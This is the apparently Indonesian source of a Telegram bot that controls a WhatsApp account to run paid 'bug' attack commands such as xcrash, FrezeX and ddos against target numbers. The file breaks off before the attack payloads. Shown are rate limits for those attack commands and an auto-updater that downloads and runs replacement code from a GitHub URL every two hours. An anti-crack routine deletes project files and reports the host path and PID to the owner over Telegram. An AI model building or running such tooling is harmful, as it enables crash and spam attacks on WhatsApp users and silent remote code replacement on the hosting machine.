const { Telegraf, Markup, session } = require("telegraf"); 
const fs = require("fs");
const path = require("path");
const moment = require("moment-timezone");
const {
    // === Socket & Connection ===
    makeWASocket,
    makeCacheableSignalKeyStore,
    useMultiFileAuthState,
    fetchLatestBaileysVersion,
    fetchLatestWaWebVersion,
    DisconnectReason,
    Browsers,
    delay,

    // === Message Handling ===
    downloadContentFromMessage,
    downloadAndSaveMediaMessage,
    generateWAMessageFromContent,
    generateWAMessageContent,
    generateForwardMessageContent,
    generateWAMessage,
    prepareWAMessageMedia,
    prepareWAMessageContent,
    getContentType,
    getAggregateVotesInPollMessage,
    getStream,

    // === JID & User ===
    areJidsSameUser,
    jidDecode,
    jidEncode,
    mentionedJid,

    // === Group & Community ===
    emitGroupParticipantsUpdate,
    emitGroupUpdate,
    GroupMetadata,
    WAGroupMetadata,
    WAGroupInviteMessage,

    // === Auth & Keys ===
    AuthenticationState,
    initInMemoryKeyStore,
    BufferJSON,
    useSingleFileAuthState,
    removeAuthState,

    // === Media ===
    MediaType,
    Mimetype,
    MimetypeMap,
    MediaPathMap,
    WAMediaUpload,
    WAMessage,
    WAMessageContent,
    WAMessageStatus,

    // === Interactive Messages ===
    InteractiveMessage,
    templateMessage,
    Header,

    // === Proto & Constants ===
    proto,
    WAProto,
    MessageType,
    MessageTypeProto,
    MessageOptions,
    ChatModification,
    ReconnectMode,
    WAContextInfo,
    WALocationMessage,
    WATextMessage,
    WAContactMessage,
    WAContactsArrayMessage,
    WAUrlInfo,
    URL_REGEX,
    WA_DEFAULT_EPHEMERAL,
    WA_MESSAGE_STATUS_TYPE,
    WA_MESSAGE_STUB_TYPES,
    PHONENUMBER_MCC,
    MediaConnInfo,
    GroupSettingChange,
    WAFlag,
    WANode,
    WAMetric,
    Presence,
    AnyMessageContent,
    WASocket,
    isBaileys,

    // === Utility ===
    encodeSignedDeviceIdentity,
    encodeWAMessage,
    encodeNewsletterMessage,
    decryptMessageNode,
    generateMessageID,
    generateMessageIDV2,
    generateMessageTag,
    patchMessageBeforeSending,
    relayWAMessage,
    processTime,
    Browser,
    BaileysError,
    MessageRetryMap,
    ProxyAgent,
    waChatKey
} = require("@whiskeysockets/baileys");

const pino = require("pino");
const chalk = require("chalk");
const axios = require("axios");
const vm = require('vm');
const https = require('https');
const readline = require('readline');
const { BOT_TOKEN, OWNER_IDS, LOG_GROUP_ID, CHANNEL_USERNAME } = require("./config.js");
const crypto = require('crypto');
const sessionPath = './session';
let bots = [];
const bot = new Telegraf(BOT_TOKEN);

// ============================================================
// AUTO UPDATE CONFIG (PUBLIC REPO — tanpa token)
// ============================================================
const UPDATE_URL =
  "https://raw.githubusercontent.com/cistiansaputraa-alt/yanduyy/main/index.js";

// Repo public → header cukup User-Agent
const UPDATE_HEADERS = { "User-Agent": "RafaelBot-Updater" };

const UPDATE_FILE_PATH = path.join(__dirname, "index.js");
const UPDATE_TEMP_PATH = path.join(__dirname, ".index.tmp.js");
const UPDATE_BACKUP_PATH = path.join(__dirname, "index.js.backup");
const UPDATE_FLAG_PATH = path.join(__dirname, ".last-update");
const IS_CHILD = process.env.RAFAEL_CHILD === "1";
const userBugSelection = new Map();
const attackConfig = new Map();
const multiBugSession = new Map();
const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));
const { exec } = require("child_process");
const OWNER_ID = Array.isArray(OWNER_IDS) ? OWNER_IDS[0] : OWNER_IDS;
const ownerID = OWNER_ID;
const isOwner = (userId) => {
  const id = String(userId);
  return Array.isArray(OWNER_IDS)
    ? OWNER_IDS.map(String).includes(id)
    : String(OWNER_IDS) === id;
};
// [KOMPONEN 1] MESSAGE QUEUE — Anti-bentrok pengiriman
class MessageQueue {
  constructor() {
    this.queue = [];
    this.processing = false;
  }

  async add(task) {
    return new Promise((resolve, reject) => {
      this.queue.push({ task, resolve, reject });
      this._process();
    });
  }

  async _process() {
    if (this.processing) return;
    this.processing = true;

    while (this.queue.length > 0) {
      const { task, resolve, reject } = this.queue.shift();
      try {
        if (!sock || !isWhatsAppConnected) {
          throw new Error('Socket tidak siap');
        }
        const result = await task();
        resolve(result);
      } catch (err) {
        console.error('[QUEUE] Task gagal:', err?.message);
        reject(err);
      }
      await new Promise(r => setTimeout(r, 800));
    }

    this.processing = false;
  }

  get length() { return this.queue.length; }
}

const sendQueue = new MessageQueue();
// [KOMPONEN 2] TARGET LOCK — Anti double-send ke nomor yang sama
const targetLocks = new Map();

async function withTargetLock(target, fn) {
  while (targetLocks.get(target)) {
    await new Promise(r => setTimeout(r, 200));
  }
  targetLocks.set(target, true);
  try {
    return await fn();
  } finally {
    targetLocks.delete(target);
  }
}
// [KOMPONEN 3] SAFE RELAY — Cek socket hidup sebelum kirim
function isSockAlive(s) {
  return !!(s && s.user && s.ws && s.ws.readyState === 1 && isWhatsAppConnected);
}
// [KOMPONEN 4] GLOBAL ERROR HANDLER — Cegah crash dari unhandled
process.on('unhandledRejection', (reason) => {
  const msg = String(reason?.message || reason);
  if (msg.includes('Connection Closed') || msg.includes('Stream Errored')) {
    console.log(`\x1b[33m[UNHANDLED] Diabaikan: ${msg}\x1b[0m`);
    return;
  }
  console.error('\x1b[31m[UNHANDLED REJECTION]\x1b[0m', reason);
});

process.on('uncaughtException', (err) => {
  console.error('\x1b[31m[UNCAUGHT]\x1b[0m', err);
});
// === Path File ===
const premiumFile = "./Db/premiums.json";
const adminFile = "./Db/admins.json";
const dbPath = "./Db/ControlCommand.json";
const cooldownFile = './Db/cooldown.json'
// === Fungsi Load & Save JSON ===
const loadJSON = (filePath) => {
  try {
    const data = fs.readFileSync(filePath);
    return JSON.parse(data);
  } catch (err) {
    console.error(chalk.red(`Gagal memuat file ${filePath}:`), err);
    return [];
  }
};

const saveJSON = (filePath, data) => {
  fs.writeFileSync(filePath, JSON.stringify(data, null, 2));
};

function loadDB() {
if (!fs.existsSync(dbPath)) return {}
return JSON.parse(fs.readFileSync(dbPath))
}

function saveDB(data) {
fs.writeFileSync(dbPath, JSON.stringify(data, null, 2))
}

if (!fs.existsSync(dbPath)) {
  fs.writeFileSync(dbPath, JSON.stringify({ commands: {} }, null, 2));
}
// === Load Semua Data Saat Startup ===
let adminUsers = loadJSON(adminFile);
let premiumUsers = loadJSON(premiumFile);


// === Middleware Role ===
const checkOwner = (ctx, next) => {
  const userId = ctx.from.id.toString();
  if (!OWNER_IDS.map(String).includes(userId)) {
    return ctx.reply("❗Mohon Maaf Fitur Ini Khusus Owner");
  }
  return next();
};

const checkAdmin = (ctx, next) => {
  if (!adminUsers.includes(ctx.from.id.toString())) {
    return ctx.reply("❗ Mohon Maaf Fitur Ini Khusus Admin.");
  }
  next();
};

const checkPremium = async (ctx, next) => {
  const userId = ctx.from.id.toString();
  const chatId = ctx.chat?.id?.toString();
  const isOwnerUser = isOwner(userId);

  const bisaAkses =
    premiumUsers.includes(userId) ||
    isGroupPremium(chatId) ||
    isOwnerUser;

  if (!bisaAkses) {
    await ctx.reply(
      '❌ Fitur ini khusus *Premium!*\n\n' +
      '💡 Hubungi owner untuk upgrade premium.',
      { parse_mode: 'Markdown' }
    );
    return;
  }

  return next();
};
// ============================================================
// [SISTEM REST BOT] — Auto istirahat setelah 50 command bug
// ============================================================
const BUG_REST_CONFIG = {
  MAX_BUG_COMMANDS: 50,
  WINDOW_MS: 5 * 60 * 1000,
  REST_DURATION_MS: 5 * 60 * 1000,
};

const bugTracker = {
  count: 0,
  firstBugTime: null,
  isResting: false,
  restUntil: null,
  restTimer: null,
  windowTimer: null,
};

// Daftar command bug (tanpa 'tes' — karena /tes = cek biasa)
const BUG_COMMANDS = [
  'xspam', 'xcrash', 'hardcore', 'core',
  'kill', 'out', 'FrezeX', 'xcore',
  'bandgb', 'ddos'
];

function isBugCommand(text) {
  if (!text || !text.startsWith('/')) return false;
  let cmd = text.split(' ')[0].toLowerCase().replace('@', '').replace('/', '');
  return BUG_COMMANDS.includes(cmd);
}

// ── Start mode REST (versi FIX: reset count + clear timer) ─
async function startRestMode() {
  // Clear timer lama kalau ada
  if (bugTracker.restTimer) clearTimeout(bugTracker.restTimer);
  if (bugTracker.windowTimer) clearTimeout(bugTracker.windowTimer);

  bugTracker.isResting = true;
  bugTracker.restUntil = Date.now() + BUG_REST_CONFIG.REST_DURATION_MS;

  const totalBug = bugTracker.count; // simpan sebelum reset
  bugTracker.count = 0;              // ← RESET COUNT
  bugTracker.firstBugTime = null;    // ← RESET WINDOW

  const restEnd = new Date(bugTracker.restUntil);
  const restEndStr = formatDateTime(restEnd);

  console.log(chalk.red.bold(`
╔══════════════════════════════════════╗
║  🛑 BOT MASUK MODE REST              ║
║  Total Bug: ${totalBug} command
║  Rest Until: ${restEndStr}
╚══════════════════════════════════════╝
  `));

  try {
    await bot.telegram.sendMessage(
      OWNER_ID,
      `🛑 *BOT MODE REST AKTIF*\n\n` +
      `📊 Total Bug : *${totalBug}* command\n` +
      `⏰ Rest Sampai : *${restEndStr}*\n` +
      `⏳ Durasi : *5 menit*\n\n` +
      `ℹ️ Selama rest, hanya *Owner & Admin* yang bisa pakai command.`,
      { parse_mode: 'Markdown' }
    );
  } catch (e) {
    console.error('[REST] Gagal notif owner:', e.message);
  }

  if (LOG_GROUP_ID) {
    try {
      await bot.telegram.sendMessage(
        LOG_GROUP_ID,
        `🛑 *BOT MODE REST AKTIF*\n\n` +
        `📊 Total Bug : *${totalBug}* command\n` +
        `⏰ Rest Sampai : *${restEndStr}*`,
        { parse_mode: 'Markdown' }
      );
    } catch (e) {}
  }

  bugTracker.restTimer = setTimeout(async () => {
    bugTracker.isResting = false;
    bugTracker.restUntil = null;

    console.log(chalk.green.bold('\n✅ BOT KEMBALI NORMAL — Rest selesai.\n'));

    try {
      await bot.telegram.sendMessage(
        OWNER_ID,
        `✅ *BOT KEMBALI NORMAL*\n\nMode rest selesai. Semua user bisa pakai command lagi.`,
        { parse_mode: 'Markdown' }
      );
    } catch (e) {}
  }, BUG_REST_CONFIG.REST_DURATION_MS);
}

// ── Track command bug ──────────────────────────────────────
function trackBugCommand() {
  if (bugTracker.isResting) return;

  const now = Date.now();

  if (bugTracker.firstBugTime && (now - bugTracker.firstBugTime) > BUG_REST_CONFIG.WINDOW_MS) {
    bugTracker.count = 0;
    bugTracker.firstBugTime = null;
    if (bugTracker.windowTimer) clearTimeout(bugTracker.windowTimer);
  }

  if (!bugTracker.firstBugTime) {
    bugTracker.firstBugTime = now;
    bugTracker.windowTimer = setTimeout(() => {
      if (!bugTracker.isResting) {
        bugTracker.count = 0;
        bugTracker.firstBugTime = null;
      }
    }, BUG_REST_CONFIG.WINDOW_MS);
  }

  bugTracker.count++;

  console.log(chalk.yellow(
    `[BUG-TRACKER] ${bugTracker.count}/${BUG_REST_CONFIG.MAX_BUG_COMMANDS} command bug dalam window 5 menit`
  ));

  if (bugTracker.count >= BUG_REST_CONFIG.MAX_BUG_COMMANDS) {
    if (bugTracker.windowTimer) clearTimeout(bugTracker.windowTimer);
    // FIX: pakai .catch() biar gak unhandled rejection
    startRestMode().catch(err =>
      console.error('[REST] Gagal start:', err.message)
    );
  }
}

// ── Middleware cek mode REST ───────────────────────────────
async function checkRestMode(ctx, next) {
  if (!bugTracker.isResting) return next();

  const userId = ctx.from.id.toString();
  const isOwnerUser = isOwner(userId);
  const isAdminUser = adminUsers.includes(userId);

  // Owner & Admin bebas
  if (isOwnerUser || isAdminUser) return next();

  const sisaMs = bugTracker.restUntil - Date.now();
  if (sisaMs <= 0) return next();

  const sisaMenit = Math.floor(sisaMs / 60000);
  const sisaDetik = Math.floor((sisaMs % 60000) / 1000);

  await ctx.reply(
    `🛑 *BOT SEDANG ISTIRAHAT*\n\n` +
    `⏳ Sisa waktu : *${sisaMenit} menit ${sisaDetik} detik*\n` +
    `📊 Total bug yang dijalankan : *${bugTracker.count}* command\n\n` +
    `ℹ️ Hanya *Owner & Admin* yang bisa pakai command saat ini.\n` +
    `Bot akan kembali normal otomatis.`,
    { parse_mode: 'Markdown' }
  );
  return;
}

// ============================================================
// [COOLDOWN KHUSUS] hardcore & core — 2 menit
// ============================================================
const SPECIAL_CD_MS = 2 * 60 * 1000; // 2 menit
const specialCooldowns = new Map();  // key: `${userId}_${cmd}` → timestamp

const checkSpecialCooldown = (ctx, next) => {
  const userId = ctx.from.id.toString();
  const text = ctx.message?.text || '';
  let cmd = text.split(' ')[0].toLowerCase().replace('@', '').replace('/', '');

  // Hanya berlaku untuk hardcore & core
  if (!['hardcore', 'core'].includes(cmd)) return next();

  const key = `${userId}_${cmd}`;
  const now = Date.now();
  const lastUsed = specialCooldowns.get(key);

  if (lastUsed) {
    const diff = now - lastUsed;
    if (diff < SPECIAL_CD_MS) {
      const sisaMs = SPECIAL_CD_MS - diff;
      const sisaMenit = Math.floor(sisaMs / 60000);
      const sisaDetik = Math.floor((sisaMs % 60000) / 1000);

      ctx.reply(
        `⏳ *Cooldown Command /${cmd}*\n\n` +
        `Kamu baru saja memakai command ini.\n` +
        `⏰ Sisa waktu : *${sisaMenit} menit ${sisaDetik} detik*\n\n` +
        `ℹ️ Command \`/${cmd}\` hanya bisa dipakai 1x per 2 menit.`,
        { parse_mode: 'Markdown' }
      );
      return;
    }
  }

  // Catat waktu pakai
  specialCooldowns.set(key, now);
  next();
};

const loadCooldown = () => {
    try {
        const data = fs.readFileSync(cooldownFile)
        return JSON.parse(data).cooldown || 5
    } catch {
        return 5
    }
}

const saveCooldown = (seconds) => {
    fs.writeFileSync(cooldownFile, JSON.stringify({ cooldown: seconds }, null, 2))
}

let cooldown = loadCooldown()
const userCooldowns = new Map()

const checkCooldown = (ctx, next) => {
    const userId = ctx.from.id
    const now = Date.now()

    if (userCooldowns.has(userId)) {
        const lastUsed = userCooldowns.get(userId)
        const diff = (now - lastUsed) / 1000

        if (diff < cooldown) {
            const remaining = Math.ceil(cooldown - diff)
            ctx.reply(`⏳ ☇ Harap menunggu ${remaining} detik`)
            return
        }
    }

    userCooldowns.set(userId, now)
    next()
}
// === Fungsi Admin / Premium ===
const addadmin = (userId) => {
  if (!adminUsers.includes(userId)) {
    adminUsers.push(userId);
    saveJSON(adminFile, adminUsers);
  }
};

const removeAdmin = (userId) => {
  adminUsers = adminUsers.filter((id) => id !== userId);
  saveJSON(adminFile, adminUsers);
};

const addpremium = (userId) => {
  if (!premiumUsers.includes(userId)) {
    premiumUsers.push(userId);
    saveJSON(premiumFile, premiumUsers);
  }
};

const removePremium = (userId) => {
  premiumUsers = premiumUsers.filter((id) => id !== userId);
  saveJSON(premiumFile, premiumUsers);
};
bot.use(session());
bot.use(checkRestMode);  

let sock = null;
let isWhatsAppConnected = false;
let linkedWhatsAppNumber = "";
const usePairingCode = true;
let isReconnecting = false;        // ← PINDAHKAN dari bawah ke sini
let lastActivity = Date.now();     // ← TAMBAHAN untuk watchdog
///////// RANDOM IMAGE JIR \\\\\\\
const randomImages = [
"https://files.catbox.moe/hd29if.jpg",
];

const getRandomImage = () =>
  randomImages[Math.floor(Math.random() * randomImages.length)];
// Func Block/Unblock Command
const checkCommandEnabled = async (ctx, next) => {
  if (!ctx.message?.text) return next();

  const text = ctx.message.text.trim();

  if (!text.startsWith("/")) return next();

  // ============================================================
  // [BUG TRACKER] Hitung command bug otomatis
  // ============================================================
  if (isBugCommand(text)) {
    trackBugCommand();
  }

  // ambil command utama
  let cmd = text.split(" ")[0].toLowerCase();

  // hapus @botusername
  if (cmd.includes("@")) {
    cmd = cmd.split("@")[0];
  }

  const db = loadDB();
  const chatId = String(ctx.chat.id);

  // GLOBAL DISABLE COMMAND
  if (db.commands?.[cmd]?.disabled) {
    return ctx.reply(
      db.commands[cmd].reason ||
      "⛔ Command ini dimatikan."
    );
  }
  // BLOCK COMMAND CHAT
  const blocked =
    db.groupCmdBlock?.[chatId] || [];

  // normalize semua cmd
  const normalizedBlocked = blocked.map(c =>
    c.toLowerCase().split("@")[0]
  );

  if (normalizedBlocked.includes(cmd)) {
    return ctx.reply(
      "⛔ Command ini diblock di chat ini."
    );
  }

  return next();
};

// Fungsi untuk mendapatkan waktu uptime
const getUptime = () => {
  const uptimeSeconds = process.uptime();
  const hours = Math.floor(uptimeSeconds / 3600);
  const minutes = Math.floor((uptimeSeconds % 3600) / 60);
  const seconds = Math.floor(uptimeSeconds % 60);

  return `${hours}h ${minutes}m ${seconds}s`;
};

const question = (query) =>
  new Promise((resolve) => {
    const rl = require("readline").createInterface({
      input: process.stdin,
      output: process.stdout,
    });
    rl.question(query, (answer) => {
      rl.close();
      resolve(answer);
    });
  });

// ============================================================
// AUTO UPDATE SYSTEM — Semua di index.js
// ============================================================
function downloadUpdate(url, outputPath) {
  return new Promise((resolve, reject) => {
    const file = fs.createWriteStream(outputPath);
    let settled = false;
    const finish = (error) => {
      if (settled) return;
      settled = true;
      file.close(() => {
        if (error) fs.rm(outputPath, { force: true }, () => {});
        error ? reject(error) : resolve();
      });
    };

    const request = https.get(
      url,
      { headers: { "User-Agent": "RafaelBot-Updater" }, timeout: 30000 },
      (res) => {
        if (res.statusCode !== 200) {
          res.resume();
          return finish(new Error(`HTTP_${res.statusCode}`));
        }
        res.pipe(file);
        file.once("finish", () => finish());
      }
    );
    request.setTimeout(30000, () => request.destroy(new Error("UPDATE_TIMEOUT")));
    request.once("error", finish);
    file.once("error", finish);
  });
}

async function performUpdate(ctx) {
  const msg = await ctx.reply("🔄 *Memeriksa update...*", { parse_mode: "Markdown" });

  try {
    if (fs.existsSync(UPDATE_FILE_PATH)) {
      fs.copyFileSync(UPDATE_FILE_PATH, UPDATE_BACKUP_PATH);
    }

    await downloadUpdate(UPDATE_URL, UPDATE_TEMP_PATH);

    const newContent = fs.readFileSync(UPDATE_TEMP_PATH, "utf8");
    if (!newContent || newContent.length < 1000 || !newContent.includes("require(")) {
      throw new Error("File update tidak valid / korup");
    }

    const currentContent = fs.readFileSync(UPDATE_FILE_PATH, "utf8");
    if (currentContent === newContent) {
      fs.rm(UPDATE_TEMP_PATH, { force: true }, () => {});
      await ctx.telegram.editMessageText(
        msg.chat.id, msg.message_id, null,
        "✅ *Bot sudah versi terbaru!*",
        { parse_mode: "Markdown" }
      );
      return;
    }

    fs.renameSync(UPDATE_TEMP_PATH, UPDATE_FILE_PATH);

    await ctx.telegram.editMessageText(
      msg.chat.id, msg.message_id, null,
      "✅ *Update berhasil!*\n\n♻️ Bot restart otomatis dalam 3 detik...\n📦 Backup: `index.js.backup`",
      { parse_mode: "Markdown" }
    );

    console.log(chalk.green.bold("[UPDATE] File diperbarui. Restart otomatis..."));
    setTimeout(() => process.kill(process.pid, 'SIGTERM'), 3000);
  } catch (err) {
    console.error(chalk.red(`[UPDATE] Gagal: ${err.message}`));
    try {
      if (fs.existsSync(UPDATE_BACKUP_PATH)) {
        fs.copyFileSync(UPDATE_BACKUP_PATH, UPDATE_FILE_PATH);
        console.log(chalk.yellow("[UPDATE] Rollback."));
      }
    } catch {}
    await ctx.telegram.editMessageText(
      msg.chat.id, msg.message_id, null,
      `❌ *Gagal update!*\n\n\`${err.message}\``,
      { parse_mode: "Markdown" }
    );
  } finally {
    try { if (fs.existsSync(UPDATE_TEMP_PATH)) fs.rmSync(UPDATE_TEMP_PATH, { force: true }); } catch {}
  }
}

function startUpdateChecker() {
  const CHECK_INTERVAL = 2 * 60 * 60 * 1000; // ✅ 2 jam sekali
  let isUpdating = false;

    async function checkOnce(isBootTime = false) {
    if (isUpdating) return false;

    try {
      const res = await axios.get(UPDATE_URL, {
        headers: UPDATE_HEADERS,
        timeout: 15000,
        responseType: "text",
      });

      const remoteContent = res.data;
      const localContent = fs.readFileSync(UPDATE_FILE_PATH, "utf8");

      const hash = (s) => crypto.createHash("md5").update(s).digest("hex");
      const isSame = remoteContent && hash(remoteContent) === hash(localContent);

      if (!remoteContent || isSame || !remoteContent.includes("require(")) {
        if (isBootTime) {
          console.log(chalk.green.bold("[UPDATE] Bot sudah versi terbaru ✅"));
        } else {
          console.log(chalk.gray(`[UPDATE] Cek rutin: sudah versi terbaru (${new Date().toLocaleTimeString()})`));
        }
        return false;
      }

      isUpdating = true;
      console.log(chalk.yellow.bold("[UPDATE] Versi baru terdeteksi! Mengunduh..."));

      fs.copyFileSync(UPDATE_FILE_PATH, UPDATE_BACKUP_PATH);
      await downloadUpdate(UPDATE_URL, UPDATE_TEMP_PATH);

      const newContent = fs.readFileSync(UPDATE_TEMP_PATH, "utf8");
      if (!newContent || !newContent.includes("require(")) {
        throw new Error("File update tidak valid");
      }

      fs.renameSync(UPDATE_TEMP_PATH, UPDATE_FILE_PATH);
      console.log(chalk.green.bold("[UPDATE] Berhasil diperbarui."));

      if (isBootTime) {
        if (fs.existsSync(UPDATE_FLAG_PATH)) {
          const last = Number(fs.readFileSync(UPDATE_FLAG_PATH, "utf8")) || 0;
          if (Date.now() - last < 5 * 60 * 1000) {
            console.log(chalk.yellow("[UPDATE] Skip restart — baru update <5 menit lalu."));
            isUpdating = false;
            return false;
          }
        }
        fs.writeFileSync(UPDATE_FLAG_PATH, String(Date.now()));
        console.log(chalk.cyan.bold("[UPDATE] Restart untuk pakai versi baru..."));
        process.kill(process.pid, 'SIGTERM');
      }

      try {
        await bot.telegram.sendMessage(
          OWNER_ID,
          "🔄 *Auto-Update Berhasil!*\n\nBot restart otomatis.",
          { parse_mode: "Markdown" }
        );
      } catch {}

      setTimeout(() => process.kill(process.pid, 'SIGTERM'), 3000);
      return true;
    } catch (err) {
      if (!String(err.message).includes("HTTP_")) {
        console.log(chalk.gray(`[UPDATE-CHECK] ${err.message}`));
      }
      isUpdating = false;
      return false;
    }
  }

  checkOnce(true).then((updated) => {
    if (updated) return;
    setInterval(() => checkOnce(false), CHECK_INTERVAL);
    console.log(chalk.cyan.bold(`[UPDATE] Auto-update checker aktif (2 jam).`));
  });
}

// ============================================================
// SUPERVISOR — Parent yang spawn bot sebagai child
// ============================================================
function runSupervisor() {
  const { spawn } = require("child_process");
  let restartCount = 0;
  let lastStart = Date.now();

  function spawnBot() {
    restartCount++;
    lastStart = Date.now();
    console.log(chalk.cyan.bold(`\n[SUPERVISOR] Menjalankan bot (start ke-${restartCount})...`));

    const child = spawn(process.execPath, [__filename], {
      stdio: "inherit",
      env: { ...process.env, RAFAEL_CHILD: "1" },
      cwd: __dirname,
    });

    child.on("exit", (code, signal) => {
  const uptime = ((Date.now() - lastStart) / 1000).toFixed(1);
  console.log(chalk.yellow.bold(
    `\n[SUPERVISOR] Bot berhenti. Code=${code} Signal=${signal} Uptime=${uptime}s`
  ));

  const isUpdateRestart = signal === 'SIGTERM' || code === 42;
  const delay = isUpdateRestart ? 2000 : (uptime < 10 ? 10000 : 3000);
  console.log(chalk.cyan.bold(`[SUPERVISOR] Restart dalam ${delay / 1000}s...\n`));

  setTimeout(spawnBot, delay);
});

    child.on("error", (err) => {
      console.error(chalk.red(`[SUPERVISOR] Gagal spawn: ${err.message}`));
      setTimeout(spawnBot, 5000);
    });
  }

  spawnBot();

  process.on("SIGINT", () => {
    console.log(chalk.red("\n[SUPERVISOR] Menerima SIGINT. Keluar..."));
    process.exit(0);
  });
  process.on("SIGTERM", () => {
    console.log(chalk.red("\n[SUPERVISOR] Menerima SIGTERM. Keluar..."));
    process.exit(0);
  });
}

function enableBypassProtection() {
  const { env, execArgv } = process;

  function deleteFilesOnCrack() {
    const files = [
      "package.json",
      "index.js",
      "config.js",
      ".npm",
      "node_modules",
      "settings",
      "RAFAEL ∞"
    ];
    for (const file of files) {
      try {
        const targetPath = path.join(process.cwd(), file);
        if (fs.existsSync(targetPath)) {
          fs.unlinkSync(targetPath);
          console.log(`[SECURITY] File dihapus: ${file}`);
        }
      } catch (err) {
        console.error(`[ERROR] Gagal hapus ${file}: ${err.message}`);
      }
    }
  }
  async function reportToTelegram(reason) {
    const text = `🚨 *NGAPAIN KIDS KE DETECTED!*

📂 Path: ${process.cwd()}
🖥️ Node: ${process.version}
PID: ${process.pid}
Reason: ${reason}`;

    try {
      await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
  chat_id: OWNER_ID,
        text,
        parse_mode: "Markdown"
      });
      console.log("[REPORT] MAKLO SINI GUA BYPASS YATIM😂");
    } catch (err) {
      console.error("[REPORT] EROR BJIR NGAKAK:", err.message);
    }
  }

  const trueAbort = process.abort;
  const trueExit = process.exit;
  const trueToString = Function.prototype.toString.toString();

  Object.defineProperty(process, "abort", { value: trueAbort, configurable: false, writable: false });
  Object.defineProperty(process, "exit", { value: trueExit, configurable: false, writable: false });

  Object.freeze(Function.prototype);
  Object.freeze(axios.interceptors.request);
  Object.freeze(axios.interceptors.response);

  function onCrackDetected(reason) {
    console.error(`[SECURITY] ${reason}`);
    reportToTelegram(reason);
    deleteFilesOnCrack();
    process.kill(process.pid, "SIGKILL");
  }

  if (Function.prototype.toString.toString() !== trueToString) {
    onCrackDetected("Function.prototype.toString dibajak");
  }

  if (execArgv.length === 0 && process.execArgv !== execArgv) {
    onCrackDetected("process.execArgv dipalsukan");
  }

  ["HTTP_PROXY", "HTTPS_PROXY", "NODE_TLS_REJECT_UNAUTHORIZED", "NODE_OPTIONS"].forEach((key) => {
    if (env[key] && env[key] !== "" && env[key] !== "1") {
      onCrackDetected(`ENV ${key} disuntik: ${env[key]}`);
    }
  });

  if (axios.interceptors.request.handlers.length > 0 || axios.interceptors.response.handlers.length > 0) {
    onCrackDetected("Interceptor axios terdeteksi");
  }

  try {
    if (typeof module._load === "function") {
      const moduleCode = module._load.toString();
      if (!moduleCode.includes("tryModuleLoad") && !moduleCode.includes("Module._load")) {
        onCrackDetected("Module._load dibajak");
      }
    }
  } catch (err) {
    onCrackDetected("Gagal akses module._load: " + err.message);
  }

  try {
    const trap = Object.getOwnPropertyDescriptor(require.cache, "get");
    if (typeof trap === "function") {
      onCrackDetected("require.cache diproxy");
    }
  } catch {
    onCrackDetected("require.cache error");
  }

  console.log("\x1b[41m\x1b[37m[🔐 PROTECTION]\x1b[0m BY BRONSEW ACTIVE 🔥\n");
}

const GITHUB_TOKEN_LIST_URL =
  "https://raw.githubusercontent.com/cistiansaputraa-alt/yandayy/main/token.json";

bot.telegram.setMyCommands([
  { command: 'start', description: 'Developer @bronsew' },
  { command: 'antipromo', description: 'Toggle anti promosi per group' },
  { command: 'privatemute', description: 'Toggle auto mute private chat' },
]).then(() => {
  console.log('Daftar perintah berhasil diperbarui!');
}).catch((error) => {
  console.error('Gagal memperbarui perintah:', error);
});

bot.on("my_chat_member", async (ctx) => {
  try {
    const update = ctx.update.my_chat_member;
    const newStatus = update.new_chat_member.status;
    const oldStatus = update.old_chat_member.status;
    const chat = update.chat;

    const isGroup = chat.type === "group" || chat.type === "supergroup";
    if (!isGroup) return;

    const chatId = String(chat.id);
    const chatTitle = chat.title || "Tanpa Nama";

    // bot baru masuk / diundang ke group
    const joinedStatuses = ["member", "administrator"];
    const oldLeftStatuses = ["left", "kicked"];

    if (joinedStatuses.includes(newStatus) && oldLeftStatuses.includes(oldStatus)) {
      if (isGroupApproved(chatId)) return;

      await ctx.telegram.sendMessage(
        chat.id,
        "⚠️ Bot masuk ke group ini tapi belum di-approve owner.\n\nJika dalam 10 menit tidak di-approve, bot akan keluar otomatis."
      );

      // notif ke owner
      await ctx.telegram.sendMessage(
        ownerID,
        `🚨 BOT DITAMBAHKAN KE GROUP BARU\n\n` +
        `Nama Group: ${chatTitle}\n` +
        `Chat ID: ${chatId}\n\n` +
        `Gunakan:\n` +
        `/approved ${chatId}\n\n` +
        `Jika ingin mengizinkan bot aktif di group tersebut.`
      );

      // simpan pending + timer 10 menit
      if (pendingGroups.has(chatId)) {
        clearTimeout(pendingGroups.get(chatId).timeout);
      }

      const timeout = setTimeout(async () => {
        try {
          if (!isGroupApproved(chatId)) {
            await ctx.telegram.sendMessage(
              chat.id,
              "❌ Group tidak di-approve dalam 10 menit. Bot keluar otomatis."
            );
            await ctx.telegram.leaveChat(chat.id);
          }
        } catch (e) {
          console.error("Gagal leave group:", e.message);
        } finally {
          pendingGroups.delete(chatId);
        }
      }, 10 * 60 * 1000);

      pendingGroups.set(chatId, {
        title: chatTitle,
        timeout
      });
    }
  } catch (err) {
    console.error("Error my_chat_member:", err.message);
  }
});

function isGroupApproved(chatId) {
  return approvedGroups.includes(String(chatId));
}

//---------(HANDLER APPROVED GB ) ---------//
const APPROVED_GROUPS_FILE = path.join(__dirname, "approved_groups.json");

let approvedGroups = [];
let pendingGroups = new Map();

function loadApprovedGroups() {
  try {
    if (fs.existsSync(APPROVED_GROUPS_FILE)) {
      const raw = fs.readFileSync(APPROVED_GROUPS_FILE, "utf8");
      const parsed = JSON.parse(raw);
      approvedGroups = Array.isArray(parsed) ? parsed : [];
    } else {
      approvedGroups = [];
    }
  } catch (err) {
    console.error("Gagal load approved groups:", err.message);
    approvedGroups = [];
  }
}

function saveApprovedGroups() {
  try {
    fs.writeFileSync(APPROVED_GROUPS_FILE, JSON.stringify(approvedGroups, null, 2));
  } catch (err) {
    console.error("Gagal save approved groups:", err.message);
  }
}

loadApprovedGroups();

async function fetchValidTokens() {
  try {
    const response = await axios.get(GITHUB_TOKEN_LIST_URL);
    return response.data.tokens;
  } catch (error) {
    console.error(
      chalk.red("❌ Gagal mengambil daftar token dari GitHub:", error.message)
    );
    return [];
  }
}

async function validateToken() {
  console.log(chalk.blue("🔍 Memeriksa apakah token bot valid..."));

  const validTokens = await fetchValidTokens();
  if (!validTokens.includes(BOT_TOKEN)) {
    console.log(chalk.red("❌ Token tidak valid! Bot tidak dapat dijalankan."));
    process.exit(1);
  }

  console.log(chalk.green(` JANGAN LUPA MASUK CH INFO SCRIPT⠀⠀`));
  startBot();
}

function startBot() {
  console.clear();
  console.log(chalk.white(`
